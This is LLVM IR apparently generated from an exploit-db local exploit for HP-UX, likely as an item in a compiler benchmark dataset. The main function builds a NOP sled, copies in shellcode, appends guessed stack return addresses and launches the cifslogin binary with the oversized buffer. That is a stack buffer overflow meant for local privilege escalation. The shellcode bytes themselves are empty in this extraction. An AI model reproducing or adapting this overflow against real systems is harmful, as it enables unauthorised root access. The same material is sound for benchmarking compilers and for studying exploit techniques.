; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_21577.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_21577.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFF_LEN = common dso_local global i32 0, align 4
@buffer = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@T_LEN = common dso_local global i64 0, align 8
@addr = common dso_local global i32 0, align 4
@NOP = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [35 x i8] c"SP=0x%x EXP_SP=0x%x OFF=0x%x (%i)\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"Addr =0x%x NOP_LEN=%i\0A\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"BUFFER_LEN=%i\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"/opt/cifsclient/bin/cifslogin\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"cifslogin\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"123\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i64*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64*, align 8
  store i32 0, i32* %1, align 4
  store i32 800, i32* %2, align 4
  %8 = load i32, i32* @BUFF_LEN, align 4
  %9 = sdiv i32 %8, 4
  store i32 %9, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %10 = load i8*, i8** @buffer, align 8
  %11 = load i32, i32* @BUFF_LEN, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8, i8* %10, i64 %12
  %14 = bitcast i8* %13 to i64*
  store i64* %14, i64** %5, align 8
  %15 = load i8*, i8** @buffer, align 8
  %16 = load i32, i32* @BUFF_LEN, align 4
  %17 = load i8*, i8** @shellcode, align 8
  %18 = call i32 @strlen(i8* %17)
  %19 = sub nsw i32 %16, %18
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %15, i64 %20
  store i8* %21, i8** %6, align 8
  %22 = load i8*, i8** @buffer, align 8
  %23 = bitcast i8* %22 to i64*
  store i64* %23, i64** %7, align 8
  %24 = ptrtoint i32* %2 to i64
  %25 = load i64, i64* @T_LEN, align 8
  %26 = add nsw i64 %24, %25
  %27 = and i64 %26, 4294967168
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @addr, align 4
  store i32 0, i32* %4, align 4
  br label %29

29:                                               ; preds = %34, %0
  %30 = load i32, i32* %4, align 4
  %31 = load i32, i32* %3, align 4
  %32 = icmp slt i32 %30, %31
  br i1 %32, label %33, label %41

33:                                               ; preds = %29
  br label %34

34:                                               ; preds = %33
  %35 = load i64, i64* @NOP, align 8
  %36 = load i64*, i64** %7, align 8
  %37 = load i32, i32* %4, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %4, align 4
  %39 = sext i32 %37 to i64
  %40 = getelementptr inbounds i64, i64* %36, i64 %39
  store i64 %35, i64* %40, align 8
  br label %29

41:                                               ; preds = %29
  %42 = load i8*, i8** %6, align 8
  %43 = load i8*, i8** @shellcode, align 8
  %44 = load i8*, i8** @shellcode, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = call i32 @memcpy(i8* %42, i8* %43, i32 %45)
  store i32 0, i32* %4, align 4
  br label %47

47:                                               ; preds = %57, %41
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* @T_LEN, align 8
  %51 = load i32, i32* @BUFF_LEN, align 4
  %52 = sext i32 %51 to i64
  %53 = sub nsw i64 %50, %52
  %54 = sdiv i64 %53, 4
  %55 = icmp slt i64 %49, %54
  br i1 %55, label %56, label %67

56:                                               ; preds = %47
  br label %57

57:                                               ; preds = %56
  %58 = load i32, i32* @addr, align 4
  %59 = load i32, i32* %2, align 4
  %60 = add nsw i32 %58, %59
  %61 = sext i32 %60 to i64
  %62 = load i64*, i64** %5, align 8
  %63 = load i32, i32* %4, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %4, align 4
  %65 = sext i32 %63 to i64
  %66 = getelementptr inbounds i64, i64* %62, i64 %65
  store i64 %61, i64* %66, align 8
  br label %47

67:                                               ; preds = %47
  %68 = ptrtoint i32* %2 to i64
  %69 = and i64 %68, 4294967104
  %70 = trunc i64 %69 to i32
  %71 = load i32, i32* @addr, align 4
  %72 = load i32, i32* %2, align 4
  %73 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i32 %70, i32 %71, i32 %72)
  %74 = load i32, i32* @addr, align 4
  %75 = load i32, i32* %2, align 4
  %76 = add nsw i32 %74, %75
  %77 = load i32, i32* @BUFF_LEN, align 4
  %78 = load i8*, i8** @shellcode, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = sub nsw i32 %77, %79
  %81 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 %76, i32 %80)
  %82 = load i8*, i8** @buffer, align 8
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i32 %83)
  %85 = load i8*, i8** @buffer, align 8
  %86 = call i32 @execl(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* %85, i32* null)
  %87 = load i32, i32* %1, align 4
  ret i32 %87
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
